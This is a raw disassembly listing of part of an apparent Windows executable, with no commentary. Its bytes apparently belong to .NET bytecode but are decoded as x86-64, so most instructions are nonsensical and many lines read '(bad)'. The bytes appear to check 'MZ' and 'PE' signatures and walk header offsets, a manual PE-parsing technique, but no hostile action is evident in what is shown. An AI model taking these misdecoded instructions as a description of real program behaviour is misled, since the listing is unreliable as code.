   140001560:	25 01 00 00 09       	and    $0x9000001,%eax
   140001565:	00 00                	add    %al,(%rax)
   140001567:	11 28                	adc    %ebp,(%rax)
   140001569:	c8 00 00 06          	enter  $0x0,$0x6
   14000156d:	13 0a                	adc    (%rdx),%ecx
   14000156f:	11 0a                	adc    %ecx,(%rdx)
   140001571:	2d 03 16 6a 2a       	sub    $0x2a6a1603,%eax
   140001576:	11 0a                	adc    %ecx,(%rdx)
   140001578:	1f                   	(bad)
   140001579:	18 6a 58             	sbb    %ch,0x58(%rdx)
   14000157c:	4c 13 09             	adc    (%rcx),%r9
   14000157f:	11 09                	adc    %ecx,(%rcx)
   140001581:	2d 03 16 6a 2a       	sub    $0x2a6a1603,%eax
   140001586:	11 09                	adc    %ecx,(%rcx)
   140001588:	1f                   	(bad)
   140001589:	10 6a 58             	adc    %ch,0x58(%rdx)
   14000158c:	4c 0a 06             	rex.WR or (%rsi),%r8b
   14000158f:	13 0f                	adc    (%rdi),%ecx
   140001591:	06                   	(bad)
   140001592:	1f                   	(bad)
   140001593:	30 6a 58             	xor    %ch,0x58(%rdx)
   140001596:	4c 39 e0             	cmp    %r12,%rax
   140001599:	00 00                	add    %al,(%rax)
   14000159b:	00 06                	add    %al,(%rsi)
   14000159d:	1f                   	(bad)
   14000159e:	60                   	(bad)
   14000159f:	6a 58                	push   $0x58
   1400015a1:	4c 28 14 00          	rex.WR sub %r10b,(%rax,%rax,1)
   1400015a5:	00 06                	add    %al,(%rsi)
   1400015a7:	02 40 cf             	add    -0x31(%rax),%al
   1400015aa:	00 00                	add    %al,(%rax)
   1400015ac:	00 06                	add    %al,(%rsi)
   1400015ae:	1f                   	(bad)
   1400015af:	30 6a 58             	xor    %ch,0x58(%rdx)
   1400015b2:	4c 0b 07             	or     (%rdi),%r8
   1400015b5:	13 08                	adc    (%rax),%ecx
   1400015b7:	11 08                	adc    %ecx,(%rax)
   1400015b9:	49 20 4d 5a          	rex.WB and %cl,0x5a(%r13)
   1400015bd:	00 00                	add    %al,(%rax)
   1400015bf:	2e 05 dd c1 00 00    	cs add $0xc1dd,%eax
   1400015c5:	00 11                	add    %dl,(%rcx)
   1400015c7:	08 1f                	or     %bl,(%rdi)
   1400015c9:	3c 6a                	cmp    $0x6a,%al
   1400015cb:	58                   	pop    %rax
   1400015cc:	fe                   	(bad)
   1400015cd:	12 02                	adc    (%rdx),%al
   1400015cf:	4a 6a 07             	rex.WX push $0x7
   1400015d2:	58                   	pop    %rax
   1400015d3:	13 07                	adc    (%rdi),%eax
   1400015d5:	11 07                	adc    %eax,(%rdi)
   1400015d7:	4a 20 50 45          	rex.WX and %dl,0x45(%rax)
   1400015db:	00 00                	add    %al,(%rax)
   1400015dd:	2e 05 dd a3 00 00    	cs add $0xa3dd,%eax
   1400015e3:	00 11                	add    %dl,(%rcx)
   1400015e5:	07                   	(bad)
   1400015e6:	20 88 00 00 00 6a    	and    %cl,0x6a000000(%rax)
   1400015ec:	58                   	pop    %rax
   1400015ed:	4a 13 06             	rex.WX adc (%rsi),%rax
   1400015f0:	11 06                	adc    %eax,(%rsi)
   1400015f2:	2d 05 dd 8e 00       	sub    $0x8edd05,%eax
   1400015f7:	00 00                	add    %al,(%rax)
   1400015f9:	11 06                	adc    %eax,(%rsi)
   1400015fb:	6e                   	outsb  (%rsi),(%dx)
   1400015fc:	07                   	(bad)
   1400015fd:	58                   	pop    %rax
   1400015fe:	0d 09 1f 1c 6a       	or     $0x6a1c1f09,%eax
   140001603:	58                   	pop    %rax
   140001604:	4a 6e                	rex.WX outsb (%rsi),(%dx)
   140001606:	07                   	(bad)
   140001607:	58                   	pop    %rax
   140001608:	13 0e                	adc    (%rsi),%ecx
   14000160a:	09 1f                	or     %ebx,(%rdi)
   14000160c:	20 6a 58             	and    %ch,0x58(%rdx)
   14000160f:	4a 6e                	rex.WX outsb (%rsi),(%dx)
   140001611:	07                   	(bad)
   140001612:	58                   	pop    %rax
   140001613:	13 0d 09 1f 24 6a    	adc    0x6a241f09(%rip),%ecx        # 0x1aa243522
   140001619:	58                   	pop    %rax
   14000161a:	4a 6e                	rex.WX outsb (%rsi),(%dx)
   14000161c:	07                   	(bad)
   14000161d:	58                   	pop    %rax
   14000161e:	13 0c 16             	adc    (%rsi,%rdx,1),%ecx
   140001621:	0c 08                	or     $0x8,%al
   140001623:	09 1f                	or     %ebx,(%rdi)
   140001625:	18 6a 58             	sbb    %ch,0x58(%rdx)
   140001628:	4a 34 44             	rex.WX xor $0x44,%al
   14000162b:	08 6e 13             	or     %ch,0x13(%rsi)
   14000162e:	05 11 05 1a 6a       	add    $0x6a1a0511,%eax
   140001633:	5a                   	pop    %rdx
   140001634:	11 0d 58 4a 6e 06    	adc    %ecx,0x66e4a58(%rip)        # 0x1466e6092
   14000163a:	1f                   	(bad)
   14000163b:	30 6a 58             	xor    %ch,0x58(%rdx)
   14000163e:	4c 58                	rex.WR pop %rax
   140001640:	28 13                	sub    %dl,(%rbx)
   140001642:	00 00                	add    %al,(%rax)
   140001644:	06                   	(bad)
   140001645:	03 33                	add    (%rbx),%esi
   140001647:	21 11                	and    %edx,(%rcx)
   140001649:	05 18 6a 5a 11       	add    $0x115a6a18,%eax
   14000164e:	0c 58                	or     $0x58,%al
   140001650:	49 13 0b             	adc    (%r11),%rcx
   140001653:	11 0b                	adc    %ecx,(%rbx)
   140001655:	6e                   	outsb  (%rsi),(%dx)
   140001656:	1a 6a 5a             	sbb    0x5a(%rdx),%ch
   140001659:	11 0e                	adc    %ecx,(%rsi)
   14000165b:	58                   	pop    %rax
   14000165c:	4a 6e                	rex.WX outsb (%rsi),(%dx)
   14000165e:	06                   	(bad)
   14000165f:	1f                   	(bad)
   140001660:	30 6a 58             	xor    %ch,0x58(%rdx)
   140001663:	4c 58                	rex.WR pop %rax
   140001665:	13 04 de             	adc    (%rsi,%rbx,8),%eax
   140001668:	21 08                	and    %ecx,(%rax)
   14000166a:	17                   	(bad)
   14000166b:	58                   	pop    %rax
   14000166c:	0c 2b                	or     $0x2b,%al
   14000166e:	b3 de                	mov    $0xde,%bl
   140001670:	16                   	(bad)
   140001671:	26 17                	es (bad)
   140001673:	fe                   	(bad)
   140001674:	11 26                	adc    %esp,(%rsi)
   140001676:	16                   	(bad)
   140001677:	6a 13                	push   $0x13
   140001679:	04 de                	add    $0xde,%al
   14000167b:	0e                   	(bad)
   14000167c:	06                   	(bad)
   14000167d:	4c 0a 06             	rex.WR or (%rsi),%r8b
   140001680:	11 0f                	adc    %ecx,(%rdi)
   140001682:	40 0a ff             	or     %dil,%dil
   140001685:	ff                   	(bad)
   140001686:	ff 16                	call   *(%rsi)
   140001688:	6a 2a                	push   $0x2a
   14000168a:	11 04 2a             	adc    %eax,(%rdx,%rbp,1)
   14000168d:	00 00                	add    %al,(%rax)
   14000168f:	00 41 1c             	add    %al,0x1c(%rcx)
   140001692:	00 00                	add    %al,(%rax)
   140001694:	01 00                	add    %eax,(%rax)
   140001696:	00 00                	add    %al,(%rax)
   140001698:	45 00 00             	add    %r8b,(%r8)
   14000169b:	00 c4                	add    %al,%ah
   14000169d:	00 00                	add    %al,(%rax)
   14000169f:	00 0d 01 00 00 07    	add    %cl,0x7000001(%rip)        # 0x1470016a6
   1400016a5:	00 00                	add    %al,(%rax)
   1400016a7:	00 09                	add    %cl,(%rcx)
   1400016a9:	01 00                	add    %eax,(%rax)
   1400016ab:	00 03                	add    %al,(%rbx)
   1400016ad:	30 02                	xor    %al,(%rdx)
   1400016af:	00 0f                	add    %cl,(%rdi)
   1400016b1:	01 00                	add    %eax,(%rax)
   1400016b3:	00 0a                	add    %cl,(%rdx)
   1400016b5:	00 00                	add    %al,(%rax)
   1400016b7:	11 7f 1d             	adc    %edi,0x1d(%rdi)
   1400016ba:	00 00                	add    %al,(%rax)
   1400016bc:	04 28                	add    $0x28,%al
   1400016be:	14 00                	adc    $0x0,%al
   1400016c0:	00 06                	add    %al,(%rsi)
   1400016c2:	0a 06                	or     (%rsi),%al
   1400016c4:	7f 1e                	jg     0x1400016e4
   1400016c6:	00 00                	add    %al,(%rax)
   1400016c8:	04 28                	add    $0x28,%al
   1400016ca:	13 00                	adc    (%rax),%eax
   1400016cc:	00 06                	add    %al,(%rsi)
   1400016ce:	28 15 00 00 06 80    	sub    %dl,-0x7ffa0000(%rip)        # 0xc00616d4
   1400016d4:	36 00 00             	ss add %al,(%rax)
   1400016d7:	04 06                	add    $0x6,%al
   1400016d9:	7f 1f                	jg     0x1400016fa
   1400016db:	00 00                	add    %al,(%rax)
   1400016dd:	04 28                	add    $0x28,%al
   1400016df:	13 00                	adc    (%rax),%eax
   1400016e1:	00 06                	add    %al,(%rsi)
   1400016e3:	28 15 00 00 06 80    	sub    %dl,-0x7ffa0000(%rip)        # 0xc00616e9
   1400016e9:	44 00 00             	add    %r8b,(%rax)
   1400016ec:	04 06                	add    $0x6,%al
   1400016ee:	7f 20                	jg     0x140001710
   1400016f0:	00 00                	add    %al,(%rax)
   1400016f2:	04 28                	add    $0x28,%al
   1400016f4:	13 00                	adc    (%rax),%eax
   1400016f6:	00 06                	add    %al,(%rsi)
   1400016f8:	28 15 00 00 06 80    	sub    %dl,-0x7ffa0000(%rip)        # 0xc00616fe
   1400016fe:	38 00                	cmp    %al,(%rax)
   140001700:	00 04 06             	add    %al,(%rsi,%rax,1)
   140001703:	7f 21                	jg     0x140001726
   140001705:	00 00                	add    %al,(%rax)
   140001707:	04 28                	add    $0x28,%al
   140001709:	13 00                	adc    (%rax),%eax
   14000170b:	00 06                	add    %al,(%rsi)
   14000170d:	28 15 00 00 06 80    	sub    %dl,-0x7ffa0000(%rip)        # 0xc0061713
   140001713:	41 00 00             	add    %al,(%r8)
   140001716:	04 06                	add    $0x6,%al
   140001718:	7f 22                	jg     0x14000173c
   14000171a:	00 00                	add    %al,(%rax)
   14000171c:	04 28                	add    $0x28,%al
   14000171e:	13 00                	adc    (%rax),%eax
   140001720:	00 06                	add    %al,(%rsi)
   140001722:	28 15 00 00 06 80    	sub    %dl,-0x7ffa0000(%rip)        # 0xc0061728
   140001728:	40 00 00             	rex add %al,(%rax)
   14000172b:	04 06                	add    $0x6,%al
   14000172d:	7f 23                	jg     0x140001752
   14000172f:	00 00                	add    %al,(%rax)
   140001731:	04 28                	add    $0x28,%al
   140001733:	13 00                	adc    (%rax),%eax
   140001735:	00 06                	add    %al,(%rsi)
   140001737:	28 15 00 00 06 80    	sub    %dl,-0x7ffa0000(%rip)        # 0xc006173d
   14000173d:	47 00 00             	rex.RXB add %r8b,(%r8)
   140001740:	04 06                	add    $0x6,%al
   140001742:	7f 24                	jg     0x140001768
   140001744:	00 00                	add    %al,(%rax)
   140001746:	04 28                	add    $0x28,%al
   140001748:	13 00                	adc    (%rax),%eax
   14000174a:	00 06                	add    %al,(%rsi)
   14000174c:	28 15 00 00 06 80    	sub    %dl,-0x7ffa0000(%rip)        # 0xc0061752
   140001752:	3b 00                	cmp    (%rax),%eax
   140001754:	00 04 06             	add    %al,(%rsi,%rax,1)
   140001757:	7f 25                	jg     0x14000177e
   140001759:	00 00                	add    %al,(%rax)
   14000175b:	04 28                	add    $0x28,%al
   14000175d:	13 00                	adc    (%rax),%eax
   14000175f:	00 06                	add    %al,(%rsi)
   140001761:	28 15 00 00 06 80    	sub    %dl,-0x7ffa0000(%rip)        # 0xc0061767
   140001767:	33 00                	xor    (%rax),%eax
   140001769:	00 04 06             	add    %al,(%rsi,%rax,1)
   14000176c:	7f 26                	jg     0x140001794
   14000176e:	00 00                	add    %al,(%rax)
   140001770:	04 28                	add    $0x28,%al
   140001772:	13 00                	adc    (%rax),%eax
   140001774:	00 06                	add    %al,(%rsi)
   140001776:	28 15 00 00 06 80    	sub    %dl,-0x7ffa0000(%rip)        # 0xc006177c
   14000177c:	3a 00                	cmp    (%rax),%al
   14000177e:	00 04 7e             	add    %al,(%rsi,%rdi,2)
   140001781:	36 00 00             	ss add %al,(%rax)
   140001784:	04 2c                	add    $0x2c,%al
   140001786:	3c 7e                	cmp    $0x7e,%al
   140001788:	44 00 00             	add    %r8b,(%rax)
   14000178b:	04 2c                	add    $0x2c,%al
   14000178d:	35 7e 38 00 00       	xor    $0x387e,%eax
   140001792:	04 2c                	add    $0x2c,%al
   140001794:	2e 7e 41             	jle,pn 0x1400017d8
   140001797:	00 00                	add    %al,(%rax)
   140001799:	04 2c                	add    $0x2c,%al
   14000179b:	27                   	(bad)
   14000179c:	7e 40                	jle    0x1400017de
   14000179e:	00 00                	add    %al,(%rax)
   1400017a0:	04 2c                	add    $0x2c,%al
   1400017a2:	20 7e 47             	and    %bh,0x47(%rsi)
   1400017a5:	00 00                	add    %al,(%rax)
   1400017a7:	04 2c                	add    $0x2c,%al
   1400017a9:	19 7e 3b             	sbb    %edi,0x3b(%rsi)
   1400017ac:	00 00                	add    %al,(%rax)
   1400017ae:	04 2c                	add    $0x2c,%al
   1400017b0:	12 7e 33             	adc    0x33(%rsi),%bh
   1400017b3:	00 00                	add    %al,(%rax)
   1400017b5:	04 2c                	add    $0x2c,%al
   1400017b7:	0b 7e 3a             	or     0x3a(%rsi),%edi
   1400017ba:	00 00                	add    %al,(%rax)
   1400017bc:	04 2c                	add    $0x2c,%al
   1400017be:	04 17                	add    $0x17,%al
   1400017c0:	0b 2b                	or     (%rbx),%ebp
   1400017c2:	02 16                	add    (%rsi),%dl
   1400017c4:	0b 07                	or     (%rdi),%eax
   1400017c6:	2a cc                	sub    %ah,%cl
   1400017c8:	03 30                	add    (%rax),%esi
   1400017ca:	02 00                	add    (%rax),%al
   1400017cc:	2b 00                	sub    (%rax),%eax
   1400017ce:	00 00                	add    %al,(%rax)
   1400017d0:	0b 00                	or     (%rax),%eax
   1400017d2:	00 11                	add    %dl,(%rcx)
   1400017d4:	02 28                	add    (%rax),%ch
   1400017d6:	d4                   	(bad)
   1400017d7:	00 00                	add    %al,(%rax)
   1400017d9:	06                   	(bad)
   1400017da:	0b 07                	or     (%rdi),%eax
   1400017dc:	2d 02 16 2a 02       	sub    $0x22a1602,%eax
   1400017e1:	28 14 00             	sub    %dl,(%rax,%rax,1)
   1400017e4:	00 06                	add    %al,(%rsi)
   1400017e6:	03 28                	add    (%rax),%ebp
   1400017e8:	13 00                	adc    (%rax),%eax
   1400017ea:	00 06                	add    %al,(%rsi)
   1400017ec:	0c 08                	or     $0x8,%al
   1400017ee:	28 15 00 00 06 0a    	sub    %dl,0xa060000(%rip)        # 0x14a0617f4
   1400017f4:	06                   	(bad)
   1400017f5:	2c 06                	sub    $0x6,%al
   1400017f7:	06                   	(bad)
   1400017f8:	07                   	(bad)
   1400017f9:	59                   	pop    %rcx
   1400017fa:	6d                   	insl   (%dx),(%rdi)
   1400017fb:	2b 01                	sub    (%rcx),%eax
   1400017fd:	16                   	(bad)
   1400017fe:	2a cc                	sub    %ah,%cl
   140001800:	03 30                	add    (%rax),%esi
   140001802:	04 00                	add    $0x0,%al
   140001804:	68 00 00 00 0c       	push   $0xc000000
   140001809:	00 00                	add    %al,(%rax)
   14000180b:	11 16                	adc    %edx,(%rsi)
   14000180d:	6a 16                	push   $0x16
   14000180f:	6a 12                	push   $0x12
   140001811:	00 28                	add    %ch,(%rax)
   140001813:	dc 00                	faddl  (%rax)
   140001815:	00 06                	add    %al,(%rsi)
   140001817:	2c 02                	sub    $0x2,%al
   140001819:	16                   	(bad)
   14000181a:	2a 06                	sub    (%rsi),%al
   14000181c:	7f 27                	jg     0x140001845
   14000181e:	00 00                	add    %al,(%rax)
   140001820:	04 16                	add    $0x16,%al
   140001822:	6a 12                	push   $0x12
   140001824:	01 28                	add    %ebp,(%rax)
   140001826:	e0 00                	loopne 0x140001828
   140001828:	00 06                	add    %al,(%rsi)
   14000182a:	2c 09                	sub    $0x9,%al
   14000182c:	06                   	(bad)
   14000182d:	28 d6                	sub    %dl,%dh
   14000182f:	00 00                	add    %al,(%rax)
   140001831:	06                   	(bad)
   140001832:	26 16                	es (bad)
   140001834:	2a 06                	sub    (%rsi),%al
   140001836:	28 e7                	sub    %ah,%bh
   140001838:	00 00                	add    %al,(%rax)
   14000183a:	06                   	(bad)
   14000183b:	2c 09                	sub    $0x9,%al
   14000183d:	06                   	(bad)
   14000183e:	28 d6                	sub    %dl,%dh
   140001840:	00 00                	add    %al,(%rax)
   140001842:	06                   	(bad)
   140001843:	26 16                	es (bad)
   140001845:	2a 1f                	sub    (%rdi),%bl
   140001847:	64 28 d9             	fs sub %bl,%cl
   14000184a:	00 00                	add    %al,(%rax)
   14000184c:	06                   	(bad)
   14000184d:	07                   	(bad)
   14000184e:	20 00                	and    %al,(%rax)
   140001850:	01 00                	add    %eax,(%rax)
   140001852:	00 12                	add    %dl,(%rdx)
   140001854:	03 12                	add    (%rdx),%edx
   140001856:	02 28                	add    (%rax),%ch
   140001858:	e3 00                	jrcxz  0x14000185a
   14000185a:	00 06                	add    %al,(%rsi)
   14000185c:	2c 09                	sub    $0x9,%al
   14000185e:	06                   	(bad)
   14000185f:	28 d6                	sub    %dl,%dh
   140001861:	00 00                	add    %al,(%rax)
   140001863:	06                   	(bad)
   140001864:	26 16                	es (bad)
   140001866:	2a 12                	sub    (%rdx),%dl
   140001868:	02 1e                	add    (%rsi),%bl
   14000186a:	58                   	pop    %rax
   14000186b:	4a 06                	rex.WX (bad)
   14000186d:	28 d6                	sub    %dl,%dh
   14000186f:	00 00                	add    %al,(%rax)
   140001871:	06                   	(bad)
   140001872:	26 2a 03             	es sub (%rbx),%al
   140001875:	30 02                	xor    %al,(%rdx)
   140001877:	00 20                	add    %ah,(%rax)
   140001879:	00 00                	add    %al,(%rax)
   14000187b:	00 0d 00 00 11 12    	add    %cl,0x12110000(%rip)        # 0x152111881
   140001881:	01 28                	add    %ebp,(%rax)
   140001883:	d8 00                	fadds  (%rax)
   140001885:	00 06                	add    %al,(%rsi)
   140001887:	26 12 00             	es adc (%rax),%al
   14000188a:	28 d2                	sub    %dl,%dl
   14000188c:	00 00                	add    %al,(%rax)
   14000188e:	06                   	(bad)
   14000188f:	26 28 d1             	es sub %dl,%cl
   140001892:	00 00                	add    %al,(%rax)
   140001894:	06                   	(bad)
   140001895:	1f                   	(bad)
   140001896:	32 5e 17             	xor    0x17(%rsi),%bl
   140001899:	58                   	pop    %rax
   14000189a:	28 d9                	sub    %bl,%cl
   14000189c:	00 00                	add    %al,(%rax)
   14000189e:	06                   	(bad)
   14000189f:	2a 03                	sub    (%rbx),%al
   1400018a1:	30 02                	xor    %al,(%rdx)
   1400018a3:	00 12                	add    %dl,(%rdx)
   1400018a5:	00 00                	add    %al,(%rax)
   1400018a7:	00 0e                	add    %cl,(%rsi)
   1400018a9:	00 00                	add    %al,(%rax)
   1400018ab:	11 16                	adc    %edx,(%rsi)
   1400018ad:	0b 16                	or     (%rsi),%edx
   1400018af:	0a 07                	or     (%rdi),%al
   1400018b1:	06                   	(bad)
   1400018b2:	58                   	pop    %rax
   1400018b3:	0b 06                	or     (%rsi),%eax
   1400018b5:	17                   	(bad)
   1400018b6:	58                   	pop    %rax
   1400018b7:	0a 06                	or     (%rsi),%al
   1400018b9:	1f                   	(bad)
   1400018ba:	64 32 f3             	fs xor %bl,%dh
   1400018bd:	2a cc                	sub    %ah,%cl
   1400018bf:	cc                   	int3
   1400018c0:	03 30                	add    (%rax),%esi
   1400018c2:	04 00                	add    $0x0,%al
   1400018c4:	98                   	cwtl
   1400018c5:	00 00                	add    %al,(%rax)
   1400018c7:	00 0f                	add    %cl,(%rdi)
   1400018c9:	00 00                	add    %al,(%rax)
   1400018cb:	11 28                	adc    %ebp,(%rax)
   1400018cd:	c9                   	leave
   1400018ce:	00 00                	add    %al,(%rax)
   1400018d0:	06                   	(bad)
   1400018d1:	0b 07                	or     (%rdi),%eax
   1400018d3:	2d 03 16 6a 2a       	sub    $0x2a6a1603,%eax
   1400018d8:	07                   	(bad)
   1400018d9:	80 51 00 00          	adcb   $0x0,0x0(%rcx)
   1400018dd:	04 02                	add    $0x2,%al
   1400018df:	1f                   	(bad)
   1400018e0:	40 28 ca             	rex sub %cl,%dl
   1400018e3:	00 00                	add    %al,(%rax)
   1400018e5:	06                   	(bad)
   1400018e6:	0a 06                	or     (%rsi),%al
   1400018e8:	2d 0a 07 28 d7       	sub    $0xd728070a,%eax
   1400018ed:	00 00                	add    %al,(%rax)
   1400018ef:	06                   	(bad)
   1400018f0:	26 16                	es (bad)
   1400018f2:	6a 2a                	push   $0x2a
   1400018f4:	07                   	(bad)
   1400018f5:	06                   	(bad)
   1400018f6:	02 28                	add    (%rax),%ch
   1400018f8:	cb                   	lret
   1400018f9:	00 00                	add    %al,(%rax)
   1400018fb:	06                   	(bad)
   1400018fc:	2d 11 06 28 d7       	sub    $0xd7280611,%eax
   140001901:	00 00                	add    %al,(%rax)
   140001903:	06                   	(bad)
   140001904:	26 07                	es (bad)
   140001906:	28 d7                	sub    %dl,%bh
   140001908:	00 00                	add    %al,(%rax)
   14000190a:	06                   	(bad)
   14000190b:	26 16                	es (bad)
   14000190d:	6a 2a                	push   $0x2a
   14000190f:	06                   	(bad)
   140001910:	80 3f 00             	cmpb   $0x0,(%rdi)
   140001913:	00 04 06             	add    %al,(%rsi,%rax,1)
   140001916:	28 e4                	sub    %ah,%ah
   140001918:	00 00                	add    %al,(%rax)
   14000191a:	06                   	(bad)
   14000191b:	02 1a                	add    (%rdx),%bl
   14000191d:	28 cc                	sub    %cl,%ah
   14000191f:	00 00                	add    %al,(%rax)
   140001921:	06                   	(bad)
   140001922:	0c 08                	or     $0x8,%al
   140001924:	2d 11 06 28 d7       	sub    $0xd7280611,%eax
   140001929:	00 00                	add    %al,(%rax)
   14000192b:	06                   	(bad)
   14000192c:	26 07                	es (bad)
   14000192e:	28 d7                	sub    %dl,%bh
   140001930:	00 00                	add    %al,(%rax)
   140001932:	06                   	(bad)
   140001933:	26 16                	es (bad)
   140001935:	6a 2a                	push   $0x2a
   140001937:	06                   	(bad)
   140001938:	04 02                	add    $0x2,%al
   14000193a:	03 28                	add    (%rax),%ebp
   14000193c:	cc                   	int3
   14000193d:	00 00                	add    %al,(%rax)
   14000193f:	06                   	(bad)
   140001940:	0d 09 2d 18 08       	or     $0x8182d09,%eax
   140001945:	28 cd                	sub    %cl,%ch
   140001947:	00 00                	add    %al,(%rax)
   140001949:	06                   	(bad)
   14000194a:	26 06                	es (bad)
   14000194c:	28 d7                	sub    %dl,%bh
   14000194e:	00 00                	add    %al,(%rax)
   140001950:	06                   	(bad)
   140001951:	26 07                	es (bad)
   140001953:	28 d7                	sub    %dl,%bh
   140001955:	00 00                	add    %al,(%rax)
   140001957:	06                   	(bad)
   140001958:	26 16                	es (bad)
   14000195a:	6a 2a                	push   $0x2a
   14000195c:	05 2c 03 05 09       	add    $0x905032c,%eax
   140001961:	55                   	push   %rbp
   140001962:	08 2a                	or     %ch,(%rdx)
   140001964:	03 30                	add    (%rax),%esi
   140001966:	0b 00                	or     (%rax),%eax
   140001968:	5b                   	pop    %rbx
   140001969:	00 00                	add    %al,(%rax)
   14000196b:	00 10                	add    %dl,(%rax)
   14000196d:	00 00                	add    %al,(%rax)
   14000196f:	11 16                	adc    %edx,(%rsi)
   140001971:	6a 13                	push   $0x13
   140001973:	04 12                	add    $0x12,%al
   140001975:	05 16 1f 10 6a       	add    $0x6a101f16,%eax
   14000197a:	fe                   	(bad)
   14000197b:	12 04 fe             	adc    (%rsi,%rdi,8),%al
   14000197e:	18 28                	sbb    %ch,(%rax)
   140001980:	f8                   	clc
   140001981:	00 00                	add    %al,(%rax)
   140001983:	06                   	(bad)
   140001984:	12 03                	adc    (%rbx),%al
   140001986:	12 05 28 06 00 00    	adc    0x628(%rip),%al        # 0x140001fb4
   14000198c:	0a 12                	or     (%rdx),%dl
   14000198e:	02 12                	add    (%rdx),%dl
   140001990:	04 28                	add    $0x28,%al
   140001992:	06                   	(bad)
   140001993:	00 00                	add    %al,(%rax)
   140001995:	0a 12                	or     (%rdx),%dl
   140001997:	01 03                	add    %eax,(%rbx)
   140001999:	28 06                	sub    %al,(%rsi)
   14000199b:	00 00                	add    %al,(%rax)
   14000199d:	0a 12                	or     (%rdx),%dl
   14000199f:	00 02                	add    %al,(%rdx)
   1400019a1:	28 06                	sub    %al,(%rsi)
   1400019a3:	00 00                	add    %al,(%rax)
   1400019a5:	0a 06                	or     (%rsi),%al
   1400019a7:	7e 0c                	jle    0x1400019b5
   1400019a9:	00 00                	add    %al,(%rax)
   1400019ab:	0a 16                	or     (%rsi),%dl
   1400019ad:	16                   	(bad)
   1400019ae:	7e 0c                	jle    0x1400019bc
   1400019b0:	00 00                	add    %al,(%rax)
   1400019b2:	0a 25 07 7e 0c 00    	or     0xc7e07(%rip),%ah        # 0x1400c97bf
   1400019b8:	00 0a                	add    %cl,(%rdx)
   1400019ba:	08 09                	or     %cl,(%rcx)
   1400019bc:	6f                   	outsl  (%rsi),(%dx)
   1400019bd:	f4                   	hlt
   1400019be:	00 00                	add    %al,(%rax)
   1400019c0:	06                   	(bad)
   1400019c1:	16                   	(bad)
   1400019c2:	2f                   	(bad)
   1400019c3:	04 16                	add    $0x16,%al
   1400019c5:	6a 2b                	push   $0x2b
   1400019c7:	02 11                	add    (%rcx),%dl
   1400019c9:	04 2a                	add    $0x2a,%al
   1400019cb:	cc                   	int3
   1400019cc:	03 30                	add    (%rax),%esi
   1400019ce:	00 00                	add    %al,(%rax)
   1400019d0:	01 00                	add    %eax,(%rax)
   1400019d2:	00 00                	add    %al,(%rax)
   1400019d4:	00 00                	add    %al,(%rax)
   1400019d6:	00 00                	add    %al,(%rax)
   1400019d8:	2a cc                	sub    %ah,%cl
   1400019da:	cc                   	int3
   1400019db:	cc                   	int3
   1400019dc:	03 30                	add    (%rax),%esi
   1400019de:	03 00                	add    (%rax),%eax
   1400019e0:	29 00                	sub    %eax,(%rax)
   1400019e2:	00 00                	add    %al,(%rax)
   1400019e4:	11 00                	adc    %eax,(%rax)
   1400019e6:	00 11                	add    %dl,(%rcx)
   1400019e8:	02 1d 6a 60 0c 08    	add    0x80c606a(%rip),%bl        # 0x1480c7a58
   1400019ee:	04 36                	add    $0x36,%al
   1400019f0:	02 04 2a             	add    (%rdx,%rbp,1),%al
   1400019f3:	03 17                	add    (%rdi),%edx
   1400019f5:	64 0b 03             	or     %fs:(%rbx),%eax
   1400019f8:	04 07                	add    $0x7,%al
   1400019fa:	59                   	pop    %rcx
   1400019fb:	36 02 04 2a          	ss add (%rdx,%rbp,1),%al
   1400019ff:	07                   	(bad)
   140001a00:	03 58 0a             	add    0xa(%rax),%ebx
   140001a03:	06                   	(bad)
   140001a04:	0d 08 06 37 04       	or     $0x4370608,%eax
   140001a09:	12 02                	adc    (%rdx),%al
   140001a0b:	2b 02                	sub    (%rdx),%eax
   140001a0d:	12 03                	adc    (%rbx),%al
   140001a0f:	4c 2a cc             	rex.WR sub %spl,%r9b
   140001a12:	cc                   	int3
   140001a13:	cc                   	int3
   140001a14:	03 30                	add    (%rax),%esi
   140001a16:	01 00                	add    %eax,(%rax)
   140001a18:	0b 00                	or     (%rax),%eax
   140001a1a:	00 00                	add    %al,(%rax)
   140001a1c:	00 00                	add    %al,(%rax)
   140001a1e:	00 00                	add    %al,(%rax)
   140001a20:	7f 2d                	jg     0x140001a4f
   140001a22:	00 00                	add    %al,(%rax)
   140001a24:	04 28                	add    $0x28,%al
   140001a26:	df 00                	filds  (%rax)
   140001a28:	00 06                	add    %al,(%rsi)
   140001a2a:	2a cc                	sub    %ah,%cl
   140001a2c:	03 30                	add    (%rax),%esi
   140001a2e:	03 00                	add    (%rax),%eax
   140001a30:	09 00                	or     %eax,(%rax)
   140001a32:	00 00                	add    %al,(%rax)
   140001a34:	00 00                	add    %al,(%rax)
   140001a36:	00 00                	add    %al,(%rax)
   140001a38:	02 2c 05 02 03 1e fe 	add    -0x1e1fcfe(,%rax,1),%ch
   140001a3f:	17                   	(bad)
   140001a40:	2a cc                	sub    %ah,%cl
   140001a42:	cc                   	int3
   140001a43:	cc                   	int3
   140001a44:	03 30                	add    (%rax),%esi
   140001a46:	05 00 3f 00 00       	add    $0x3f00,%eax
   140001a4b:	00 13                	add    %dl,(%rbx)
   140001a4d:	00 00                	add    %al,(%rax)
   140001a4f:	11 02                	adc    %eax,(%rdx)
   140001a51:	1f                   	(bad)
   140001a52:	27                   	(bad)
   140001a53:	6a 58                	push   $0x58
   140001a55:	0c 08                	or     $0x8,%al
   140001a57:	02 35 05 28 09 00    	add    0x92805(%rip),%dh        # 0x140094262
   140001a5d:	00 06                	add    %al,(%rsi)
   140001a5f:	08 28                	or     %ch,(%rax)
   140001a61:	e1 00                	loope  0x140001a63
   140001a63:	00 06                	add    %al,(%rsi)
   140001a65:	0a 06                	or     (%rsi),%al
   140001a67:	2d 0e 16 6a 16       	sub    $0x166a160e,%eax
   140001a6c:	6a 16                	push   $0x16
   140001a6e:	6a 16                	push   $0x16
   140001a70:	16                   	(bad)
   140001a71:	6a 28                	push   $0x28
   140001a73:	e2 00                	loop   0x140001a75
   140001a75:	00 06                	add    %al,(%rsi)
   140001a77:	06                   	(bad)
   140001a78:	1f                   	(bad)
   140001a79:	27                   	(bad)
   140001a7a:	6a 58                	push   $0x58
   140001a7c:	21 e0                	and    %esp,%eax
   140001a7e:	ff                   	(bad)
   140001a7f:	ff                   	(bad)
   140001a80:	ff                   	(bad)
   140001a81:	ff                   	(bad)
   140001a82:	ff                   	(bad)
   140001a83:	ff                   	(bad)
   140001a84:	ff 5f 0b             	lcall  *0xb(%rdi)
   140001a87:	07                   	(bad)
   140001a88:	1e                   	(bad)
   140001a89:	6a 59                	push   $0x59
   140001a8b:	06                   	(bad)
